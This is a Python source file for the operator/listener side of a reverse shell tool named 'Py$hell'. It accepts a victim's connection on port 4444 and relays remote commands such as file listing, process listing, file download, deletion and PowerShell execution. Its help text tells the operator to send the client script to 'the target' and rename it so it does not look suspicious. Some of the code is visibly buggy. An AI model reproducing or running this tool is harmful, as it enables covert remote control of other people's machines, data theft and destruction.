# Reverse Shell Written in python #
import platform
import socket
import subprocess
import os
import pyfiglet

s = socket.socket()
IP = "0.0.0.0"
PORT = 4444
BUF_SIZE = 2048
FORMAT = 'utf-8'
OS = platform.platform()


def main():
    global conn, addr
    colors()
    print(f"""{Blue}
    ╔═╗┬ ┬┌┼┐┬ ┬┌─┐┬  ┬  
    ╠═╝└┬┘└┼┐├─┤├┤ │  │  
    ╩   ┴ └┼┘┴ ┴└─┘┴─┘┴─┘                         
{Normal}""")
    while True:
        try:
            s.bind((IP, PORT))
            break
        except ConnectionRefusedError:
            print(f"{Red}Connections Refused{Normal}")
            s.close()
            continue
    print(f"{Light_Purple}[+] Listening For Connection...{Normal}")
    s.listen(5)
    conn, addr = s.accept()
    print(f"{Green}[+] Connection Has Been Established {Normal}")
    print(f"{Cyan}[+] Server Started{Normal}" + "\n" + " | " "IP " + addr[0] + " | Port "
          + str(addr[1]) + " | ")
    answer = reverse_shell(conn)
    if answer == "exit":
        s.close()
        return 0
    else:
        while True:
            try:
                user_input = int(input("Press 1 or Else To Exit:"))
                conn.send(user_input.encode('utf-8'))
                output = conn.recv(BUF_SIZE).decode(FORMAT)
            except ValueError as e:
                print(f"{Red}[!] The Problem Is: {Light_Red}{e} {Normal}")
                continue
            if user_input == 1:
                if output == 1:
                    main()
                else:
                    s.close()
                    exit()
                continue
            else:
                return 0


def colors():
    global Yellow, Red, Normal, Green, Gray, Blue, Purple, Cyan, Light_Red, Light_Green, Light_Purple, Light_Blue
    Yellow = "\033[1;33;40m"
    Red = "\033[1;40m"
    Light_Red = '\033[2;31m'
    Normal = "\033[0;0m"
    Green = "\033[1;32m"
    Light_Green = "\033[2;32;40m"
    Gray = "\033[1;30;40m"
    Blue = "\033[1;34m"
    Light_Blue = "\033[2;34;40m"
    Cyan = '\033[1;36m'
    Purple = '\033[0;35;40m'
    Light_Purple = '\033[2;35m'
    Light_Green = "\033[2;32;40m"


def reverse_shell(conn):
    global command_split
    while True:
        out1 = conn.recv(BUF_SIZE).decode(FORMAT)
        try:
            command = input(f"\n({out1})" + ": ")
            if " " in command:
                command_split = command.split(" ")
            conn.send(command.encode(FORMAT))
            if "exit" == command.lower():
                conn.send('exit'.encode(FORMAT))
                s.close()
                print(f"{Red}\t[!][!][!]  ! EXITING !  [!][!][!]\n{Normal}")
                return "exit"
            elif "cd" in command.lower():
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                print(stdout)
                continue
            elif "ls" in command.lower():
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                stdout = "".join(stdout)
                print(stdout)
                continue

            elif "down" in command.lower():
                filename = command_split[1]
                with open(filename, 'wb') as file_to_write:
                    while True:
                        data = s.recv(BUF_SIZE * 10).decode(FORMAT)
                        if not data:
                            break
                        file_to_write.write(bytes(data))
                    file_to_write.close()
            elif "help1" in command.lower():
                help()
                continue
            elif "ps" in command.lower():
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                print(stdout + "\n")
                continue
            else:
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                print(str(stdout))
                continue
        except Exception as e:
            print(f"{Red}[!] Wrong Options, {Light_Red}Error: {e} {Normal}")
            continue
        except BrokenPipeError as d:
            print(f"{Red}[!] Wrong Options, {Light_Red}Error: {d} {Normal}")
            continue
        except KeyboardInterrupt as i:
            print(f"{Red}[!] Wrong Options, {Light_Red}Error: {i} {Normal}")
            s.close()
            exit()
        s.close()


def help1():
    print(f"""{Light_Blue}HELP ME PLEASE:
\tThis is Py$hell, a python based reverse shell.
\tYou need to send to the target the client side of the script.
\tIt will be in the directory by the name reverse-shell_client.py .
\tIt is recommended to change the client side name for a none suspicious name.
\n\tOptions:
\t\tNOTE: You can run any shell code you want but those are reserved!
\t\tcd - : Back to the last directory
\t\tcd .. : Back to the previews directory
\t\tcd  : Empty cd will navigate to the root directory
\t\tcd <path>: Path will navigate to the path directory
\t\tls : Will show the current directory continuing 
\t\tmkdir : Create a new directory
\t\trm -f : Remove a file
\t\trm -d : Remove a directory
\t\ttouch : Create a file 
\t\thelp : Help section of the tool
\t\tstart : Starting a file
\t\tps : Showing running process 
\t\tifconfig : For showing interfaces and IP's 
\t\tpowershell <powershell command> : For running a powershell command (only for windows)
\t\tsysinfo : Show the system information\n
    {Normal}""")


if __name__ == '__main__':
    main()
    s.close()
